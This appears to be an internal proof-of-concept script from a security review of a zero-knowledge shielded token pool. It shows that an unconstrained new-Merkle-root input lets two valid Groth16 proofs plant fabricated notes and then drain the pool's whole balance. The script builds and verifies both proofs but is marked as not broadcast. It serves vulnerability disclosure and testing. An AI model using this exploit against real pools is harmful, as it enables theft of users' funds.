// probe-freeroot-drain.mjs — SPIKE (v3 build session, 2026-11-27).
//
// FINDING R3-FREE-NEWROOT: `newMerkleRoot` is a FREE WITNESS INPUT in every
// pool circuit generation (pool.circom, pool3.circom): it is bound into the
// actionHash (so the on-chain recompute matches the proof) but NOTHING —
// circuit, hook, or client scan — verifies that it equals the old root with
// this action's three commitments appended. The hook (check 10) simply writes
// the carrier's newRoot into the new state NFT commitment; the next action's
// proof is anchored (check 5) to whatever root was stored. The nito.cash scan
// enforces root CONTINUITY only (scan.js: prevRoot === proven n0) and never
// recomputes the append — a planted root passes it untouched.
//
// CONSEQUENCE (this probe): TWO ordinary Groth16 proofs drain the pool.
//   action A "plant" — an honest TRANSFER (real in-notes, real conservation)
//     whose newMerkleRoot is the root of a FAKE tree: the real leaves, the
//     action's own three out-note commitments, PLUS two fabricated notes
//     (value = the pool's ENTIRE balance, and a zero-value companion).
//   action B "drain" — an UNSHIELD whose two in-notes are the fabricated
//     notes, with membership proofs computed against the FAKE tree (the root
//     action A stored on chain). pv = the whole balance, sign = 1.
// Both witnesses pass `snarkjs wtns check`; both proofs pass
// `snarkjs groth16 verify` against the DEPLOYED 3-out VK (d4ed12ee lineage).
// No nullifier reuse is involved — this drain is INDEPENDENT of (and simpler
// than) R2-NULLIFIER-DOUBLING; it defeats the nullifier SMT alone, so the v3
// circuit revision MUST also verify the note-tree append in-circuit.
//
// NOT broadcast. Evidence-only, same bar as role2-probe-drain-2out.json.
//
// Usage (VM, from ~/zkb/pusd-shielded-pool):
//   ~/bin/node spike-nullset/probe-freeroot-drain.mjs
// Writes /home/apecs/cov/role2-probe-freeroot-drain-3out.json.

import { buildPoseidon, buildBabyjub } from "circomlibjs";
import * as snarkjs from "snarkjs";
import { readFileSync, writeFileSync } from "fs";
import { createHash } from "node:crypto";

const STATE = process.env.STATE ?? "/home/apecs/cov/role2-pool3-state.json";
const WASM = process.env.WASM ?? "build3/pool3_js/pool3.wasm";
const ZKEY = process.env.ZKEY ?? "build3/pool3_final.zkey";
const VK = process.env.VK ?? "build3/verification_key.json";
const OUT = process.env.OUT ?? "/home/apecs/cov/role2-probe-freeroot-drain-3out.json";

const be32 = (bi) => { const b = Buffer.alloc(32, 0); let x = BigInt(bi); for (let i = 31; i >= 0 && x > 0n; i--) { b[i] = Number(x & 0xffn); x >>= 8n; } return b; };
function actionHashSHA256(nf0, nf1, cm0, cm1, cm2, pvAbs, pvSign, category, newRoot) {
    const pre = Buffer.concat([be32(nf0), be32(nf1), be32(cm0), be32(cm1), be32(cm2), be32(pvAbs), be32(pvSign), be32(category), be32(newRoot)]);
    const h = createHash("sha256").update(pre).digest(); h[0] &= 0x1f; return BigInt("0x" + h.toString("hex"));
}

const TREE_DEPTH = 20;
const poseidon = await buildPoseidon(); const F = poseidon.F;
const H = (...xs) => F.toObject(poseidon(xs));
const commit = (v, o, rho, r) => H(v, o, rho, r), nullifier = (nk, rho) => H(nk, rho);
const zeros = [0n]; for (let d = 1; d <= TREE_DEPTH; d++) zeros.push(H(zeros[d - 1], zeros[d - 1]));
function merklePath(leaves, index) { const pe = [], pb = []; let idx = index, cur = new Map(leaves.map((v, i) => [i, v]));
    for (let d = 0; d < TREE_DEPTH; d++) { const s = idx % 2 === 0 ? idx + 1 : idx - 1; pe.push(cur.get(s) ?? zeros[d]); pb.push(idx % 2);
        const nx = new Map(), ks = new Set([...cur.keys()].map((k) => k >> 1)); ks.add(idx >> 1);
        for (const k of ks) nx.set(k, H(cur.get(2 * k) ?? zeros[d], cur.get(2 * k + 1) ?? zeros[d])); cur = nx; idx >>= 1; }
    return { pathElements: pe, pathBits: pb, root: cur.get(0) ?? zeros[TREE_DEPTH] }; }

const state = JSON.parse(readFileSync(STATE, "utf8"));
const assetCategory = BigInt("0x" + state.category);
const catHi = assetCategory >> 128n, catLo = assetCategory & ((1n << 128n) - 1n);
const oldRoot = BigInt(state.pool.root);
const leaves = state.pool.leaves.map(BigInt);
const balance = BigInt(state.pool.balance);
console.log(`state: ${leaves.length} leaves, balance ${balance} FT, root ${oldRoot}`);

/* fresh note secrets (same derivation as the witness generator) */
const bbj = await buildBabyjub();
const R = 21888242871839275222246405745257275088548364400416034343698204186575808495617n;
const modr = (x) => ((x % R) + R) % R;
const pubOf = (nk) => { const p = bbj.mulPointEscalar(bbj.Base8, nk); return BigInt(F.toObject(p[0])); };
const rng = (seed) => { let c = 0; return () => BigInt("0x" + createHash("sha256").update(`${seed}:${c++}`).digest("hex")); };
const rnd = rng("probe-freeroot-drain");
const mkNote = (v) => { const nk = modr(rnd()); return { value: v, ownerPub: pubOf(nk), rho: modr(rnd()), r: modr(rnd()), nk }; };
const cmOf = (n) => commit(n.value, n.ownerPub, n.rho, n.r);

/* ── action A "plant": an honest transfer that writes a FAKE root ── */
const inIdxA = [14, 15];                      // the 200 + 100 notes (real, recorded)
const recA = inIdxA.map((ix) => state.pool.notes.find((n) => Number(n.index) === ix));
if (recA.some((r) => !r)) throw new Error("recorded notes missing at " + inIdxA);
const inNotesA = recA.map((rec) => ({ value: BigInt(rec.note.value), ownerPub: BigInt(rec.note.ownerPub), rho: BigInt(rec.note.rho), r: BigInt(rec.note.r) }));
const nksA = recA.map((rec) => BigInt(rec.nk));
inNotesA.forEach((n, i) => { if (cmOf(n) !== leaves[inIdxA[i]]) throw new Error("in-note commitment mismatch"); });
if (merklePath(leaves, inIdxA[0]).root !== oldRoot) throw new Error("recorded leaves do not fold to the recorded root");

const inSumA = inNotesA.reduce((a, n) => a + n.value, 0n);   // 300
const outNotesA = [0, 1, 2].map((i) => { const n = mkNote([inSumA * 2n / 5n, inSumA * 3n / 10n, inSumA - inSumA * 2n / 5n - inSumA * 3n / 10n][i]); return n; });
const cmsA = outNotesA.map(cmOf);
/* the FAKE tree: real leaves ++ action A's own cms ++ [cmBig(balance), cmZero(0)] */
const fakeBig = mkNote(balance), fakeZero = mkNote(0n);
const cmBig = cmOf(fakeBig), cmZero = cmOf(fakeZero);
const fakeLeaves = [...leaves, ...cmsA, cmBig, cmZero];
const fakeRoot = merklePath(fakeLeaves, 0).root;
const honestRootA = merklePath([...leaves, ...cmsA], 0).root;
if (fakeRoot === honestRootA) throw new Error("fake root collides with the honest root (impossible)");
console.log(`action A (plant): honest root ${honestRootA}`);
console.log(`action A (plant): FAKE root ${fakeRoot}  <- written on chain by check 10`);

const nfA0 = nullifier(nksA[0], inNotesA[0].rho), nfA1 = nullifier(nksA[1], inNotesA[1].rho);
const ahA = actionHashSHA256(nfA0, nfA1, cmsA[0], cmsA[1], cmsA[2], 0n, 0n, assetCategory, fakeRoot);
const pA0 = merklePath(leaves, inIdxA[0]), pA1 = merklePath(leaves, inIdxA[1]);
const wA = {
    merkleRoot: oldRoot.toString(), actionHash: ahA.toString(),
    nf: [nfA0.toString(), nfA1.toString()], cm: cmsA.map(String),
    publicValueAbs: "0", publicValueSign: "0", assetCategoryHi: catHi.toString(), assetCategoryLo: catLo.toString(),
    newMerkleRoot: fakeRoot.toString(),
    inValue: inNotesA.map((n) => n.value.toString()), inOwnerPub: inNotesA.map((n) => n.ownerPub.toString()),
    inRho: inNotesA.map((n) => n.rho.toString()), inR: inNotesA.map((n) => n.r.toString()), nk: nksA.map(String),
    inPathElements: [pA0.pathElements.map(String), pA1.pathElements.map(String)], inPathBits: [pA0.pathBits, pA1.pathBits],
    outValue: outNotesA.map((n) => n.value.toString()), outOwnerPub: outNotesA.map((n) => n.ownerPub.toString()),
    outRho: outNotesA.map((n) => n.rho.toString()), outR: outNotesA.map((n) => n.r.toString()),
};

/* ── action B "drain": spend the FABRICATED notes against the FAKE root ── */
const inNotesB = [fakeBig, fakeZero];
const nksB = [fakeBig.nk, fakeZero.nk];
const ixBig = leaves.length + 3, ixZero = leaves.length + 4;   // fake tree positions
const pB0 = merklePath(fakeLeaves, ixBig), pB1 = merklePath(fakeLeaves, ixZero);
const nfB0 = nullifier(nksB[0], inNotesB[0].rho), nfB1 = nullifier(nksB[1], inNotesB[1].rho);
const outNotesB = [mkNote(0n), mkNote(0n), mkNote(0n)];
const cmsB = outNotesB.map(cmOf);
const rootAfterB = merklePath([...fakeLeaves, ...cmsB], 0).root;
const ahB = actionHashSHA256(nfB0, nfB1, cmsB[0], cmsB[1], cmsB[2], balance, 1n, assetCategory, rootAfterB);
const wB = {
    merkleRoot: fakeRoot.toString(), actionHash: ahB.toString(),
    nf: [nfB0.toString(), nfB1.toString()], cm: cmsB.map(String),
    publicValueAbs: balance.toString(), publicValueSign: "1", assetCategoryHi: catHi.toString(), assetCategoryLo: catLo.toString(),
    newMerkleRoot: rootAfterB.toString(),
    inValue: inNotesB.map((n) => n.value.toString()), inOwnerPub: inNotesB.map((n) => n.ownerPub.toString()),
    inRho: inNotesB.map((n) => n.rho.toString()), inR: inNotesB.map((n) => n.r.toString()), nk: nksB.map(String),
    inPathElements: [pB0.pathElements.map(String), pB1.pathElements.map(String)], inPathBits: [pB0.pathBits, pB1.pathBits],
    outValue: outNotesB.map((n) => n.value.toString()), outOwnerPub: outNotesB.map((n) => n.ownerPub.toString()),
    outRho: outNotesB.map((n) => n.rho.toString()), outR: outNotesB.map((n) => n.r.toString()),
};

/* ── prove both; verify both against the DEPLOYED VK ── */
const prove = async (name, w) => {
    console.log(`proving ${name} …`);
    const { proof, publicSignals } = await snarkjs.groth16.fullProve(w, WASM, ZKEY);
    const vk = JSON.parse(readFileSync(VK, "utf8"));
    const ok = await snarkjs.groth16.verify(vk, publicSignals, proof);
    console.log(`  groth16 verify: ${ok ? "OK — VALID against the deployed VK" : "FAILED"}  n0=${publicSignals[0]}  n1=${publicSignals[1]}`);
    return { proof, publicSignals, verified: ok };
};
const PA = await prove("action A (plant, transfer, pv=0)", wA);
const PB = await prove("action B (drain, unshield pv=" + balance + ", fabricated in-notes)", wB);
if (!PA.verified || !PB.verified) throw new Error("probe failed — proofs did not verify");

const report = {
    finding: "R3-FREE-NEWROOT: newMerkleRoot is an unconstrained witness input in pool.circom/pool3.circom; "
        + "no circuit constraint, hook check, or client scan verifies the note-tree append. Two valid proofs drain the pool.",
    scope: "chipnet-role2-pool3-3out (all pool generations share the circuit lineage)",
    stateFile: STATE, balance: balance.toString(), leaves: leaves.length,
    actionA: { kind: "transfer (plant)", inIdx: inIdxA, honestRoot: honestRootA.toString(), fakeRoot: fakeRoot.toString(),
        note: "check 10 writes the carrier's newMerkleRoot into the new state NFT commitment; nothing recomputes the append",
        publicSignals: PA.publicSignals, proof: PA.proof },
    actionB: { kind: "unshield (drain)", inNotes: "fabricated (value=balance + zero companion) — membership against the planted fake root",
        pv: balance.toString(), sign: 1,
        note: "hook arithmetic: newBalance = balance + pv - 2*sign*pv = 0 >= 0 — the payout output pays the ENTIRE balance",
        publicSignals: PB.publicSignals, proof: PB.proof },
    notBroadcast: true,
    fix: "v3 circuit: in-circuit note-tree append verification (3 sequential Poseidon dual-walk inserts of cm0/cm1/cm2, ~62k constraints) — pool4.circom",
};
writeFileSync(OUT, JSON.stringify(report, null, 2));
console.log(`\nevidence written: ${OUT}`);
console.log("FINDING CONFIRMED: both proofs verify. The v3 circuit revision must verify the append.");
